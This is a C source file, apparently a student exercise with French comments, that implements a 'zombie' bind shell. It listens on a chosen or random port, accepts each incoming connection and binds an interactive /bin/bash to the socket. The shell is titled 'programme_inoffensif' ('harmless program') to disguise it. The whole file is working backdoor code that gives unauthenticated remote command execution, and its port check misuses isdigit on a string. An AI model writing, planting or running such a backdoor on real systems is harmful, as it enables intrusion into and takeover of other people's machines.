#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <ctype.h>
#include <sys/wait.h>

#include "utils_v2.h"
#include "network.h"

void startShell(int socketFD)
{
  pid_t pid = fork();

  if (pid == -1)
  {
    perror("fork() error");
    return;
  }

  if (pid == 0)
  {
    dup2(socketFD, STDERR_FILENO);
    dup2(socketFD, STDOUT_FILENO);
    dup2(socketFD, STDIN_FILENO);
    char *args[] = {"bash", "--title=\"programme_inoffensif\"", NULL};
    execve("/bin/bash", args, NULL);
    perror("execve() error");
    _exit(1);
  }
  else
  {
    int status;
    waitpid(pid, &status, 0);
  }
}

int getPort(int nbArg, const char *const tabArg[])
{
  int port;
  if (nbArg > 1 && isdigit(tabArg[1]))
  {
    port = atoi(tabArg[1]);
  }
  else
  {
    port = tabPorts[randomIntBetween(1, 10)];
  }

  return port;
}

int main(int argc, char const *argv[])
{
  int sockfd = initSocketServer(getPort(argc, argv));

  while (1)
  {
    int socketForThisAccept = saccept(sockfd);
    startShell(socketForThisAccept);
  }

  // Ces printf sont inutiles mais c'est pour eviter de dire que ces variables sont declarées mais pas utilisées dans zombie
  // Sinon ca compile pas
  printf("%d", nbrSockFD);
  printf("%d", sockFdPortsConnectedTab[0]);
  return 0;
}